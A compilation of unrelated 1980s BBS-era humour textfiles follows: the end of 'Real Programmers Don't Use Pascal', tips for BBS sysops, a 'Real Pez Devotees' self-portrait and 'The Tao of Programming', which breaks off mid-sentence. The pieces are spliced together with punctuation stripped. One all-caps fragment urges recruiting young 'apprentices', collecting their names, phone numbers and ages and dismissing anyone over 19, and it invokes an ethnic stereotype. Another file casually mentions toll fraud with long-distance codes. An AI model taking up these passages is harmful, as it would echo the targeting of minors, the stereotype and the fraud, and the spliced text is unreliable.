Harmful     a landmark work in programming methodology, applauded by PASCAL programmers and Quiche Eaters alike.  Besides, the determined Real Programmer can write FORTRAN programs in any language.          Real Programmers...  p. 6   The Real Programmer might compromise his principles and work on something slightly more trivial than the destruction of life as we know it, providing there's enough money in it. There are several Real Programmers building video games at Atari, for example.  But not playing them    a Real Programmer knows how to beat the machine every time  no challenge in that.   Everyone working at LucasFilm is a Real Programmer.   It would be crazy to turn down the money of fifty million Star Trek fans.   The proportion of Real Programmers in Computer Graphics is somewhat lower than the norm, mostly because nobody has found a use for computer graphics yet.  On the other hand, all computer graphics is done in FORTRAN, so there are a fair number of people doing graphics in order to avoid having to write COBOL programs.          Real Programmers...  p. 7                   THE REAL PROGRAMMER AT PLAY                                               Generally, the Real Programmer plays the same way he works    with computers. He is constantly amazed that his employer actually pays him to do what he would be doing for fun anyway  although he is careful not to express this opinion out loud .  Occasionally, the Real Programmer does step out of the office for a breath of fresh air and a beer or two.  Some tips on recognizing Real Programmers away from the computer room        At a party, the Real Programmers are the ones in the corner      talking about operating system security and how to get around it.       At a football game, the Real Programmer is the one comparing the      plays against his simulations printed on 11 by 14 fanfold paper.       At the beach, the Real Programmer is the one drawing flowcharts      in the sand.       At a funeral, the Real Programmer is the one saying  Poor George.      And he almost had the sort routine working before the coronary.        In a grocery store, the Real Programmer is the one who insists on      running the cans past the laser checkout scanner himself, because      he never could trust keypunch operators to get it right the first      time.          Real Programmers...  p. 8              THE REAL PROGRAMMER'S NATURAL HABITAT                                                    What sort of environment does the Real Programmer function best in   This is an important question for the managers of Real Programmers. Considering the amount of money it costs to keep one on the staff, it's best to put him  or her  in an environment where he can get his work done.   The typical Real Programmer lives in front of a computer terminal.  Surrounding this terminal are        Listings of all programs the Real Programmer has ever worked on,      piled in roughly chronological order on every flat surface in the      office.       Some half dozen or so partly filled cups of cold coffee.      Occasionally, there will be cigarette butts floating in the      coffee. In some cases, the cups will contain Orange Crush.       Unless he is very good, there will be copies of the OS JCL manual      and the Principles of Operation open to some particularly      interesting pages.       Taped to the wall is a line printer Snoopy calendar for the year      1969.       Strewn about the floor are several wrappers for peanut butter      filled cheese bars    the type that are made pre stale at the      bakery so they can't get any worse while waiting in the vending      machine.       Hiding in the top left hand drawer of the desk is a stash of      double stuff Oreos for special occasions.       Underneath the Oreos is a flowcharting template, left there by      the previous occupant of the office.   Real Programmers write      programs, not documentation. Leave that to the maintenance      people.     The Real Programmer is capable of working 30, 40, even 50 hours at a stretch, under intense pressure. In fact, he prefers it that way.  Bad response time doesn't bother the Real Programmer    it gives him a chance to catch a little sleep between compiles.  If there is not enough schedule pressure on the Real Programmer, he tends to make things more challenging by working on some small but interesting part of the problem for the first nine weeks, then finishing the rest in the last week, in two or three 50 hour marathons.  This not only impresses the hell out of his manager, who was despairing of ever getting the project done on time, but creates a convenient excuse for not doing the documentation.  In general        No Real Programmer works 9 to 5  unless it's the ones at night .       Real Programmers don't wear neckties.       Real Programmers don't wear high heeled shoes.       Real Programmers arrive at work in time for lunch  9 .       A Real Programmer might or might not know his wife's name. He      does, however, know the entire ASCII  or EBCDIC  code table.       Real Programmers don't know how to cook.  Grocery stores aren't      open at three in the morning.  Real Programmers survive on      Twinkies and coffee.          Real Programmers...  p. 9                           THE FUTURE                                       What of the future   It is a matter of some concern to Real Programmers that the latest generation of computer programmers are not being brought up with the same outlook on life as their elders.  Many of them have never seen a computer with a front panel.  Hardly anyone graduating from school these days can do hex arithmetic without a calculator.  College graduates these days are soft    protected from the realities of programming by source level debuggers, text editors that count parentheses, and  user friendly  operating systems.  Worst of all, some of these alleged  computer scientists  manage to get degrees without ever learning FORTRAN!  Are we destined to become an industry of Unix hackers and PASCAL programmers    From my experience, I can only report that the future is bright for Real Programmers everywhere. Neither OS 370 nor FORTRAN show any signs of dying out, despite all the efforts of PASCAL programmers the world over.  Even more subtle tricks, like adding structured coding constructs to FORTRAN have failed.  Oh sure, some computer vendors have come out with FORTRAN 77 compilers, but every one of them has a way of converting itself back into a FORTRAN 66 compiler at the drop of an option card    to compile DO loops like God meant them to be.   Even Unix might not be as bad on Real Programmers as it once was.  The latest release of Unix has the potential of an operating system worthy of any Real Programmer    two different and subtly incompatible user interfaces, an arcane and complicated teletype driver, virtual memory.  If you ignore the fact that it's  structured , even 'C' programming can be appreciated by the Real Programmer  after all, there's no type checking, variable names are seven  ten   eight   characters long, and the added bonus of the Pointer data type is thrown in    like having the best parts of FORTRAN and assembly language in one place.   Not to mention some of the more creative uses for  define.    No, the future isn't all that bad.  Why, in the past few years, the popular press has even commented on the bright new crop of computer nerds and hackers   7  and  8   leaving places like Stanford and M.I.T. for the Real World.  From all evidence, the spirit of Real Programming lives on in these young men and women.  As long as there are ill defined goals, bizarre bugs, and unrealistic schedules, there will be Real Programmers willing to jump in and Solve The Problem, saving the documentation for later.  Long live FORTRAN!

The plain truth is that bulletin boards come and go with alarming  regularity.   A few stick around, but for every one that  reaches  its second birthday, five will appear and vanish.  Here are a few  simple  tips  to insure that your effort at running  at  bulletin  board places you in the majority.  PINCH  PENNIES    You spent thousands on a computer.  It's  silly  to spend more than  1.98 for a BBS program.  You might even  find  one for free.  After all, if cheap is good, free must be  better.   Be  sure  to shop for a rock bottom price on a  modem,  too.   It  doesn't  matter if no one ever heard of that brand  before...they  will before you are through.  SCHIZOPHRENIA  IS THE ORDER OF THE DAY   Keep 'em guessing.   Try  at  least  a dozen different BBS program...after  you  officially  open your system.  That will keep the callers on their toes.  You wouldn't want to be predictable.  Change things around  constant  ly...menus,  screens,  the  flow from section  to  section.   You really don't like it when callers use logon scripts anyway.  SPEAKING  OF  BEING  PREDICTABLE   Make  your  board  part  time. Change the hours frequently.  Part of the adventure of calling  a BBS  is finding out what hours it operates.  Pick  strange  ones  noon to 3 pm Tuesday and Thursday, 6 am to noon Monday, Wednesday and  Friday, Midnight to 6 am weekends, except national  holidays and the third Tuesday in September.  DON'T WASTE MONEY ON A SECOND PHONE LINE   You don't need it  for a  part time board. You meet such interesting people who call  at 3 a.m. looking for a modem tone.  You did want to meet  interest  ing people, didn't you   TAKE THE BBS DOWN WHENEVER THE NOTION STRIKES YOU   After all, it is  your computer.  So what if you want to play Tetris at  8  pm. The callers can just listen to a busy signal for a while.  BE  RUDE TO YOUR CALLERS    They're all schmucks who  don't  know anything.  You don't have to be polite to them.  Do your best Don Rickles  imitation when they ask questions.  Call them names  and make fun of them because they don't know all about protocols  and modems  and  such. After all, you know everything  about  them... don't  you   Dump them in mid call because they take too long  to read the menus and messages...or just because you want to use the computer.  MAKE IT A DELIGHTFUL MAZE   Make your menus so complex that a PhD couldn't find his way around your BBS.  Hide the files in obscure corners and give the commands strange names.  While you're at it, build  in some  black holes  to really confound the users.   Then complain  bitterly if people just hang up instead of logging  off properly.  Follow  these simple rules and I can guarantee you will join  the vast majority of BBSs that fade into the sunset within months  or even weeks of starting up.  Now, obviously, these are not serious tips. Quite the opposite is true.  There is much more to  running a  BBS than just slapping a program and a modem on your  computer and  waiting for the phone to ring.  Let's look instead  at  some positive suggestions to help make your efforts successful.  IT PAYS TO BUY QUALITY    Ever wondered why that free software is free    Could it be because it is so bad the author couldn't  get anyone  to pay for it   How about that generic,  bargain   modem. Why  is  it  so cheap   Old technology    Inferior  parts    Poor workmanship    Want to bet on how long it will last   Good  soft  ware can make the difference between a dream and a nightmare when it  comes  to being a SysOp.  Same thing for  reliable  hardware. You DID spend thousands for the computer...so spend a hundred  or so for decent, reliable software and protect that investment.  It won't do much for the reputation of a new BBS if it is constantly off line for various malfunctions.  CHANGE IS OK, BUT IT MUST BE FOR A REASON   Callers like  change, but they also like the familiar.  Make changes slowly and  delib  erately.   If radical changes are unavoidable, warn your  callers ahead  of  time.  Make sure you are truly ready before  you  open your system to the world.  Callers get discouraged when they have to log in as new users 4 times in 4 weeks because you keep exper  imenting  with  new  programs.   Most  of  them  won't  complain, they'll just quit calling.  KEEP  IT  SIMPLE   Incredibly complex BBSs appeal mostly  to  the  hacker  types.  Are these the people you want on your  computer  Most  folks want a BBS that is simple and logical, with  commands that  make  sense and are easily remembered.  That  still  leaves plenty of room for creativity and originality.  BE  ORIGINAL   OK, you have your brand new BBS up.   It's  plain, vanilla RBBS software, right out of the distribution files.  They even  had those neat screens and menus in there all ready to  go. Now  you  sit back and wait for the callers to ooh and  aah  over your lovely system.  Don't hold your breath.  Everyone got  tired of  those screens long ago.  Come up with something fresh.   Call distant  BBSs  and get ideas.  Don't steal whole  screens  intact unless the SysOp has packaged them for distribution.  Even  then, make  a few changes to make them your very own.  This is  one  of the  best  ways to demonstrate to callers that  there  really  is something special about your BBS.  SHOULD YOUR BBS HAVE A  THEME     Maybe.  That's the best  answer I  can give.  Some theme and special purpose BBSs are  very  suc  cessful, but the world probably doesn't need another BBS based on Dungeons     Dragons.   If you are going to give  your  system  a theme,  make  sure  it is one that will be  interesting  to  most callers.  GIVE THE CALLERS WHAT THEY WANT   within reason.  Listen to  what your users have to say about the system.  ASK them what they like and  don't like.  If the majority of them hate a particular  fea  ture,  get rid of it.  If most of them want something  you  don't have,  try  to get it.  Remember, they have choices.   There  are plenty of other modems out there waiting to answer the phone.  MAKE  IT AVAILABLE AS ADVERTISED   part time boards  rarely  suc  ceed.  Some stay around through sheer inertia...just because it's too  much trouble to take them down.  Hardly anyone  calls  these boards  for long...especially if the operating hours are  bizarre and  irregular.   If it must be part time, make it  regular.   24 hours is always best.  Frankly, if you can't make the  commitment to  a separate phone line, you really aren't ready to run a  BBS. The  same goes for using the computer yourself...you promised  it would  be  available at certain hours.  Unless there  is  a  real emergency,  you aren't living up to a commitment unless you  have it on line for the promised hours.  TREAT YOUR CALLERS LIKE FRIENDS AND WELCOME GUESTS    After  all, YOU invited these people into your home!  It's true, some callers are brainless twits.  There have always been people like that and there  always will be.  But remember, for every jerk that  calls, there  are 9 or 10 really nice, interesting people.   Concentrate on  the good folks and ignore the clowns...sooner or  later  they will get tired and go away.  THINK  ABOUT  THE  KIND OF BBS YOU LIKE TO CALL     Your  callers probably like the same things.  Analyze the other BBSs you  call. What  do you like about each   What do you dislike   Do you  feel welcome  on some and like an intruder on others   Why   How  will someone  else feel after calling your board   Will they  want  to call again   HAVE PATIENCE   Be patient while your BBS builds a following with the  callers.   It may take months before the traffic is  at  the level you anticipated.  Be patient too with inexperienced users. Help  them learn instead of harassing them.  Did  you  appreciate sarcasm  and  wisecracks  when you asked  dumb   questions  as  a beginner   Everyone is a beginner sometime.  Keep these tips in mind and you will find that your BBS grows and succeeds  while countless others come and go.  Why   Because  you treat  callers with respect and consideration!  Because you  make them feel welcome.  Because you really care about what they  like and dislike.  Because you put yourself in their place and look at the situation as they do.  Does  all  of this sound like a lot of work   You're  right.   It takes  a lot of effort to run a popular and successful BBS.   But the  rewards  of meeting new people, making new  friends,  seeing other points of view, make it all worthwhile.

YOU ALL SHOULD KNOW HOW TO TELL IF THERE IS SOME KID THAT COMES FROM A GOOD JEWISH, UPPER MIDDLE CLASS FAMILY THAT WANTS TO KNOW THE HOW TO STUFF AND THAT IS OKAY.  BUT ALWAYS ASK THREE QUESTIONS OF YOUR APPRENTICES      1 WHAT IS YOUR NAME    2 WHAT IS YOUR PHONE NUMBER    3 HOW OLD ARE YOU  NUMBER THREE IS CRUCIAL..IF THEY ARE OVER 19 YEARS OF AGE, DONT WASTE YOUR TIME OR EFFORT.

Ah,  you say,  but I haven't    SEEN any files from Mr.  Pez!  To which I counter,  My annoying personality    on  the  many  boards  I  call,  not  to  mention 75 line messages,  can be    considered to be files.  And this file tells you how to be JUST  LIKE  your    favorite candy dispenser combo.                                          first part                             Real Pez Devotees as Sysops           Real Pez Devotees will be sysops in the near future,  and  have  always                          been that way.             Real  Pez  Devotees,  if  sysops,  want  to know everything about their                           users, like real names and stuff.             Real Pez Devotees don't mind leeching,  if done in mild amounts,  since                          they  know  that  leeching  is how they got all their                          files.             Real Pez Devotees really love uploads.    What the hell is  this  shit                            ALL sysops love uploads!    Ah,  my misguided friend,                          Real Pez Devotees are eternally grateful.             Real  Pez  Devotees  never  have  the  heart  to delete users who quite                          obviously are fake,  like users who  call  themselves                           BIOC  AGENT 003 ,  on the off chance that they might                          be the real person.             Real  Pez Devotees,  if finally given sysop access,  say so everywhere,                          and beg people to call the board.   In this case, The                          Works, 914 238 8195.  See                                             second part                          Real Pez Devotees as BBS users           Real  Pez  Devotees   pollute   BBS's.  That is to say,  they call them                          regularly,  say twice a day,  and post an awful  lot.                           This  is  not altogether well liked by the sysops and                          users of those boards,  but they realize  they  can't                          really  do  anything about it.  And a Pez is not such                          an bad thing to have on a  board,  since  while  they                          leech, they upload, too, and join in conversations.               corollary        Real Pez Devotees saturate their area code.           Real Pez Devotees,  sadly,  kiss ass,  and go out of their way to avoid                          confrontations,  sometimes changing  their  posistion                          right then and there.  That's not altogether bad, but                          does hurt a Pez's credibility.                   corollary        Real Pez Devotees apologize.           Real  Pez  Devotees  never  know who to put as  references ...they have                          spoken and left mail to a lot of  people,  but  think                          that it's a big step to put someone as a reference.             Real Pez Devotees leech of boards they know, but are loath to leech off                          of pirate boards,  since they don't want to look bad.                           See  Real Pez Devotees, sadly, kiss ass ..         Real  Pez Devotees use long distance services to make free calls,  but know                          that this does not make  them  considered   phreaks .                           They  use  the  codes  to call all kinds of BBS's all                          over the country once a day.                   corollary        Real  Pez  Devotees  will  never  say they  phreak  to anyone who might                          possibly know anything about it,  but will look  down                          on people who only call local Commodore 64 BBS's.             Real Pez Devotees like many kinds of IBM BBS software, notably WWIV for                          its neat ANSI  colored  graphics  tricks,  Forum  for                          its  full screen  editor,  PC Board for its enjoyable                          prospects for  leeching,  Citadel  for  its  ease  of                          logging on, reading all messages, and logging off, as                          well as the ability for anyone to create  rooms ,  or                          sub boards  NOT called SUBZ!!1 which  are  sandwiches                          that you get from a deli. ,  software called  M Link                           for   its   overall   whackiness    i.e.   individual                          ranknames and a general good humor .               corollary        Real Pez Devotees hate RBBS,  C Net  and mostly all  Commodore  64  BBS                          software , and yes, AE's without anything  attached ,                          like TAC,  TransPhor  it's new, for IBM's , or having                          BBS's attached to them.             Real  Pez  Devotees gently harass people they know,  which is sometimes                          taken out of context to try to show a Pez as mean, or                          spiteful.             Real  Pez  Devotees  are nosy,  and have tried to read messages with an                           S.  in front of them,  as  well  as   Reciever Only                           messages on PC Boards.   Note to unenlightened    PC                          Board  is an IBM BBS program,  not a general term for                          boards  run  on IBM's.  It's sort of like RBBS,  only                          spiced up with color and better  transfer  sections.                           They  also  look  at Callers Logs to find out who was                          tying up the board when they wanted to be on, and how                          many downloads people make.  If they know the sysop's                          voice number,  they'll call him if the board is busy,                          and ask who's on.                                         third part                      The Writing Styles of Real Pez Devotees            Real  Pez  Devotees  care  about spelling and proper use of grammar in                          textfiles messages,  but rarely say so.  But in their                          minds,  they  don't  really  respect people who spell                          badly and use improper grammar.  Although,   see  the                           ass kissing   section   they  will overlook improper                          grammar if the person has a national reputation  i.e.                          certain Neon Knights,  Budman  Zeek ,  and  others. .                           That's why a Pez likes Anarchy inc.  so much, because                          they seem very intelligent, as a whole.                       Ex  I looked up the word  corollary  because I wasn't                         sure how to spell it.                     Ex  I'm going to spell check this when I'm done.           Real Pez Devotees have adapted a lot of  people's  writing  styles,  as                          well  as their own,  to form what looks like a unique                          personality.  Some examples follow                            1.  Capitalizing words to emphasize points                      Ex    I can't BELIEVE you did that!                           Also, using an asterisk after the word to emphasize                         points.   Stolen from Citadels in Minnesota.                      Ex   I can't believe  you said that!                       2. Using  ...  to link common subjects, or indicate                         time passing, or end a sentence.                     Ex   I can't believe you said that...but I guess I would                          too, in that situation...who knows...                       3. Two spaces after a period.  That's pretty much                         universal, though.  As well as skipping a line                         between paragraphs.                      4. A lot of commas used, so as not to appear as a                         run on sentence.                      5. When chatting, every line begins with  Yeah,  or                          Well, .                      6. The use of  a , b , c   to distinguish separate                         points.                                          fourth part                     The Personal Habits of Real Pez Devotees           Real Pez Devotees stay up until 11 30 on weeknights,  and  wake  up  at                          5 30,  and thus are numb all day.  On weekends,  they                          stay up until 3am,  when the  boards  finally  become                          freed  up.  Or  else  they  write textfiles like this                          one.             Real Pez Devotees screw around on the computer until 10 00  every  day,                          and then do their homework.  Strangely enough,  I got                          my highest grades ever since starting this.          Real Pez Devotees drink large amounts of  Coke  Classic,  which  allows                          them to stay up to 3am.  Also,  Twix  bars are a cool                          thing  to  eat,  from  time to time.  Another fave is                          cereal   Cinnamon Life   eaten at odd hours.             Real  Pez Devotees feel awkward walking into a classroom when there are                          a lot of people already in there.  They  always  feel                          sort  of  awkward in front of lots of people.  Unless                          they are  drunk,  in  which  case  they  don't  care.                           Unfortunately,  this  is a rare happening.  Normally,                          we  the Real Pez Devotees  are hyper from Coca Cola.             Real Pez Devotees fight with their siblings.           Real  Pez  Devotees enjoy volleyball,  soccer,  and baseball,  but hate                          football and  bombardment .   A  violent  version  of                          Dodgeball.    Real  Pez  Devotees have always thought                          Speedball sounded better than it played.             Real Pez Devotees yell at their parents from time to time,  but usually                          do what they say.  Within reasonable limits.             Real Pez Devotees have really short hair, and like it that way.                                         fifth part                           Real Pez Devotees And Clothes           Real Pez Devotees wear                          khaki pants                         Banana Republic                          button downs                         Coca Cola  clothes                         Levi's  501  jeans                         Docksiders  without socks until December, usually.                                     They can take it.                          glasses.           If a Real Pez Devotee finds a shirt he likes, he'll buy several in                          different colors.  And has trouble explaining it.             Real Pez Devotees have sneakers,  but usually leave them in  their  gym                          locker,  preferring instead the ubiquitous Docksiders                          or duck boots  ugly,  but  Real  Pez  Devotees  don't                          care .                                         sixth part                                    holy shit!                            Real Pez Devotees and Music           Real Pez Devotees listen to                          Ska  which includes                           The English Beat                          The Specials                          The Skatalites                          The Selecter                          Rico Rodriguez                         Reggae  only                           Yellowman                          Black Uhuru                         old Santana records                         their own music  more on that later                          Run D.M.C.  they got hooked last year         Real Pez Devotees hate                          Top 40  including all                           Genesis                          Bon Jovi                          Madonna                          Pet Shop Boys                          and all other Top 40 fluff groups.                         Stryper  that's fucking scarier than Satanism                                  in  metal !         Real Pez Devotees are in a band,  and go over to their friend's  houses                          on  weekends  with  a lot of equipment and jam.  This                          usually results in a  song,  or  degenerates  into  a                          point  where  they  go  to  the  computer  and  start                          harassing people on CompuServe  CB .  The  songs  are                          mixed,  like rap, reggae, blues, slamdance stuff, and                          artsy Talking Heads clones.                                        seventh part                            Bullshitting Around The End         So,  I  figured  I had to start with a  Real  file.

Waiting alone  and unmoving, it is at once still and yet in constant motion. It is  the source of all programs. I do not know its name, so I will call it  the Tao of Programming.   If the Tao is great, then the operating system is great. If the  operating system is great, then the compiler is great. If the compiler  is great, then the application is great. The user is pleased and their  is harmony in the world.   The Tao of Programming flows far away and returns on the wind of  morning.                                    1.2   The Tao gave birth to machine language. Machine language gave birth to  the assembler.   The assembler gave birth to the compiler. Now their are ten thousand  languages.   Each language has its purpose, however humble. Each language expresses  the Yin and Yang of software. Each language has its place within the  Tao.   But do not program in COBOL if you can avoid it.                                    1.3    In the beginning was the Tao. The Tao gave birth to Space and Time.   Therefore Space and Time are Yin and Yang of programming.    Programmers that do not comprehend the Tao are always running out of   time and space for there programs. Programmers that comprehend the   Tao always have enough time and space to accomplish their goals.    How could it be otherwise                                     1.4    The wise programmer is told about Tao and follows it. The average   programmer is told about Tao and searches for it. The foolish   programmer is told about Tao and laughs at is.    If it were not for laughter, there would be no Tao.    The highest sounds are hardest to hear. Going forward is a way to   retreat. Great talent shows itself late in life. Even a perfect   program still has bugs.                                     3                    T h e   A n c i e n t   M a s t e r s                             B o o k   T w o                                                                                            Thus Spake the Master Programmer         After three days without programming, life becomes meaningless.                                                                                                            2.1    The programmers of old were mysterious and profound. We cannot fathom   their thoughts, so all we do is describe their appearance.    Aware, like a fox crossing the water. Alert, like a general on the   battlefield. Kind, like a hostess greeting her guests. Simple, like   uncarved blocks of wood. Opaque , like black pools in darkened caves.    Who can tell the secrets of their hearts and minds     The answer exists only in Tao.                                    2.2    Grand Master Turing once dreamed that he was a machine. When he awoke   he exclaimed          I don't know whether I am Turing dreaming that I am a machine,        or a machine dreaming that I am Turing!.                                     2.3    A programmer from a very large computer company went to a software   conference and then returned to report to his manager, saying   What   sort of programmers work for other companies  They behaved badly and   were unconcerned with appearances.  There hair was long and unkept   and their clothes were wrinkled and old. They crashed out hospitality   suite and they made rude noises during my presentation.     The manager said   I should have never sent you to the conference.   Those programmers live beyond the physical world. They consider life   absurd, an accidental coincidence. They come and go without knowing   limitations. Without a care, they live only for their programs. Why   should they bother with social conventions     They are alive within the Tao.                                     2.4    A novice asked the Master   Here is a programmer that never designs,   documents or tests his programs. Yet all who know him consider him   one of the best programmer in the world. Why is this      The Master replies   That programmer has mastered the Tao. He has   gone beyond the need for design  he does not become angry when the   system crashes, but accepts the universe without concern. He has gone   beyond the need for documentation  he no longer cares if anyone else   sees his code. He has gone beyond the need for testing  each of his   programs are perfect within themselves, serene and elegant, their   purpose self evident.  Truly, he has entered the mystery of Tao.                                       4                                 D e s i g n                           B o o k   T h r e e                                                                                            Thus spake the Master Programmer         When the program is being tested, it is too late to make design       changes.                                                                                                            3.1    There once was a man who went to a computer trade show.  Each day as   he entered, the man told the guard at the door           I am a great thief, renowned for my feats of shoplifting. Be         forewarned, for this trade show shall not escape unplundered.     This speech disturbed the guard greatly, because there were millions   of dollars of computer equipment inside, so he watched the man   carefully. But the man merely wandered from booth to booth, humming   quietly to himself.    When the man left, the guard took him aside and searched his clothes,   but nothing was to be found.    On the next day of the trade show, the man returned and chided the   guard saying   I escaped with a vast booty yesterday, but today will   be even better.  So the guard watched him ever more closely, but to   no avail.    On the final day of the trade show, the guard could restrain his   curiosity no longer.  Sir Thief,  he said,  I am so perplexed, I   cannot live in peace. Please enlighten me. What is it that you are   stealing      The man smiled.  I am stealing ideas,  he said.                                    3.2    There once was a master programmer who wrote unstructured programs. A   novice programmer, seeking to imitate him, also began to write   unstructured programs. When the novice asked the master to evaluate   his progress, the master criticized him for writing unstructured   programs, saying  What is appropriate for the master is not   appropriate for the novice. You must understand Tao before   transcending structure.                                     3.3    There was once a programmer who was attached to the court of the   warlord of Wu. The warlord asked the programmer   Which is easier to   design  an accounting package or an operating system       An operating system,  replied the programmer.    The warlord uttered an exclamation of disbelief.  Surely an   accounting package is trivial next to the complexity of an operating   system,  he said.                                       5      Not so,  said the programmer,  when designing an accounting package,   the programmer operates as a mediator between people having different   ideas  how it must operate, how its reports must appear, and how it   must conform to the tax laws. By contrast, an operating system is not   limited by outside appearances. When designing an operating system,   the programmer seeks the simplest harmony between machine and ideas.   This is why an operating system is easier to design.     The warlord of Wu nodded and smiled.  That is all good and well, but   which is easier to debug      The programmer made no reply.                                    3.4    A manager went to the master programmer and showed him the   requirements document for a new application. The manager asked the   master   How long will it take to design this system if I assign five   programmers to it       It will take one year,  said the master promptly.     But we need this system immediately or even sooner! How long will it   take if I assign ten programmers to it      The master programmer frowned.  In that case, it will take two   years.      And what if I assign a hundred programmers to it      The master programmer shrugged.  Then the design will never be   completed,  he said.                                                                6                                 C o d i n g                            B o o k   F o u r                                                                                            Thus spake the master programmer         A well written program is its own heaven  a poorly written      program is its own hell.                                                                                                            4.1    A program should be light and agile, its subroutines connected like a   string of pearls. The spirit and intent of the program should be   retained throughout. There should be neither too little or too much,   neither needless loops nor useless variables, neither lack of   structure nor overwhelming rigidity.    A program should follow the 'Law of Least Astonishment'. What is this   law  It is simply that the program should always respond to the user   in the way that astonishes him least.    A program, no matter how complex, should act as a single unit. The   program should be directed by the logic within rather than by outward   appearances.    If the program fails in these requirements, it will be in a state of   disorder and confusion. The only way to correct this is to rewrite   the program.                                    4.2    A novice asked the master   I have a program that sometime runs and   sometimes aborts. I have followed the rules of programming, yet I am   totally baffled. What is the reason for this      The master replied   You are confused because you do not understand   Tao. Only a fool expects rational behavior from his fellow humans.   Why do you expect it from a machine that humans have constructed    Computers simulate determinism  only Tao is prefect.    The rules of programming are transitory  only Tao is eternal.   Therefore you must contemplate Tao before you receive enlightenment.      But how will I know when I have received enlightenment   asked the   novice.     Your program will then run correctly,  replied the master.                                    4.3    A master was explaining the nature of Tao of to one of his novices,    The Tao is embodied in all software    regardless of how   insignificant,  said the master.     Is the Tao in a hand held calculator   asked the novice.     It is,  came the reply.                                        7      Is the Tao in a video game   continued the novice.     It is even in a video game,  said the master.     And is the Tao in the DOS for a personal computer      The master coughed and shifted his position slightly.  The lesson   is over for today,  he said.                                    4.4    Prince Wang's programmer was coding software. His fingers danced upon   the keyboard. The program compiled without an error message, and the   program ran like a gentle wind.     Excellent!  the Prince exclaimed,  Your technique is faultless!      Technique   said the programmer turning from his terminal,  What I   follow is Tao    beyond all techniques! When I first began to program   I would see before me the whole problem in one mass. After three   years I no longer saw this mass. Instead, I used subroutines. But now   I see nothing. My whole being exists in a formless void. My senses   are idle.  My spirit, free to work without plan, follows its own   instinct. In short, my program writes itself. True, sometimes there   are difficult problems. I see them coming, I slow down, I watch   silently. Then I change a single line of code and the difficulties   vanish like puffs of idle smoke. I then compile the program. I sit   still and let the joy of the work fill my being. I close my eyes for   a moment and then log off.     Prince Wang said,  Would that all of my programmers were as wise!                                                                  8                            M a i n t e n a n c e                            B o o k   F i v e                                                                                            Thus spake the master programmer         Though a program be but three lines long, someday it will have to      be maintained.                                                                                                            5.1    A well used door needs no oil on its hinges.   A swift flowing stream does not grow stagnant.   Neither sound nor thoughts can travel through a vacuum.   Software rots if not used.    These are great mysteries.                                    5.2    A manager asked a programmer how long it would take him to finish   the program on which he was working.  I will be finished tomorrow,    the programmer promptly replied.     I think you are being unrealistic,  said the manager,  Truthfully,   how long will it take      The programmer thought for a moment.  I have some features that I   wish to add. This will take at least two weeks,  he finally said.     Even that is too much to expect,  insisted the manager,  I will be   satisfied if you simply tell me when the program is complete.     The programmer agreed to this.    Several years later, the manager retired. On the way to his   retirement lunch, he discovered the programmer asleep at his   terminal. He had been programming all night.                                    5.3    A novice programmer was once assigned to code simple financial   package.    The novice worked furiously for many days, but when his master   reviewed his program, he discovered that it contained a screen   editor, a set of generalized graphics routines, an artificial   intelligence interface, but not the slightest mention of anything   financial.    When the master asked about this, the novice became indignant.    Don't be so impatient,  he said,   I'll put in the financial stuff   eventually.                                     5.4    Does a good farmer neglect a crop he has planted    Does a good teacher overlook even the most humble student    Does a good father allow a single child to starve    Does a good programmer refuse to maintain his code                                      9                             M a n a g e m e n t                             B o o k   S i x                                                                                            Thus spake the master programmer         Let the programmer be many and the managers few    then all will      be productive.                                                                                                            6.1    When managers hold endless meetings, the programmers write games.   When accountants talk of quarterly profits, the development budget   is about to be cut. When senior scientists talk blue sky, the clouds   are about to roll in.    Truly, this is not the Tao of Programming.    When managers make commitments, game programs are ignored. When   accountants make long range plans, harmony and order are about to   be restored. When senior scientists address the problems at hand,   the problems will soon be solved.    Truly, this is the Tao of Programming.                                    6.2    Why are programmers non productive  Because their time is wasted   in meetings.    Why are programmers rebellious  Because the management interferes   to much.    Why are the programmers resigning one by one  Because they are   burnt out.    Having worked for poor management, they no longer value their jobs.                                    6.3    A manager was about to be fired, but a programmer who worked for   him invented a new program that became popular and sold well. As   a result, the manager retained his job.    The manager tries to give the programmer a bonus, but the programmer   refused it, saying,  I wrote the program because I thought it was   an interesting concept, and thus I expect no reward.     The manager upon hearing this remarked,  This programmer, though he   holds a position of small esteem, understands well the proper duty   of an employee. Lets promote him to the exalted position of   management consultant!     But when told this, the programmer once more refused, saying,    I exist so that I can program. If I were promoted, I would do   nothing but waste everyone's time. Can I go now  I have a program   that I'm working on.                                         10                                     6.4    A manager went to his programmers and told them   As regards to   your work hours  you are going to have to come in at nine in the   morning and leave at five in the afternoon.  At this, all of them   became angry and several resigned on the spot.     So the manager said   All right, in that case you may set your own   working hours, as long as you finish your projects on schedule.    The programmers, now satisfied, began to come in at noon and work   to the wee hours of the morning.                                                                                      11                       C o r p o r a t e   W i s d o m                           B o o k   S e v e n                                                                                            Thus spake the master programmer         You can demonstrate a program for a corporate executive, but       you can't make him computer literate.                                                                                                            7.1    A novice asked the master   In the east there is a great tree    structure that men call 'Corporate Headquarters'. It is bloated   out of shape with vice presidents and accountants.  It issues a   multitude of memos, each saying 'Go, Hence!' or 'Go, Hither!' and   nobody knows what is meant. Every year new names are put onto the   branches, but all to no avail. How can such an unnatural entity   exist      The master replies   You perceive this immense structure and are   disturbed that it has no rational purpose. Can you not take   amusement from its endless gyrations   Do you not enjoy the   untroubled ease of programming beneath its sheltering branches    Why are you bothered by its uselessness                                      7.2    In the east there is a shark which is larger than all other fish.   It changes into a bird whose wings are like clouds filling the sky.   When this bird moves across the land, it brings a message from   Corporate Headquarters. This message it drops into the midst of the   programmers, like a seagull making its mark upon the beach. Then the   bird mounts on the wind and, with the blue sky at its back, returns   home.    The novice programmer stares in wonder at the bird, for he   understands it not. The average programmer dreads the coming of the   bird, for he fears its message. The master programmer continues to   work at his terminal, for he does not know that the bird has come   and gone.                                    7.3    The Magician of the Ivory Tower brought his latest invention for   the master programmer to examine. The magician wheeled a large   black box into the master's office while the master waited in   silence.     This is an integrated, distributed, general purpose workstation,    began the magician,  ergonomically designed with a proprietary   operating system, sixth generation languages, and multiple state of   the art user interfaces. It took my assistants several hundred man   years to construct. Is it not amazing.     The master raised his eyebrows slightly.  It is indeed amazing,  he   said.     Corporate Headquarters has commanded,  continued the magician,    that everyone use this workstation as a platform for new programs.   Do you agree to this                                       12      Certainly,  replied the master,   I will have it transported to the   data center immediately!  And the magician returned to his tower,   well pleased.    Several days later, a novice wandered into the office of the master   programmer and said,  I cannot find the listing for my new program.   Do you know where it might be       Yes,  replied the master,  the listings are stacked on the platform   in the data center.                                     7.4    The master programmer moves form program to program without fear.   No change in management can harm him. He will not 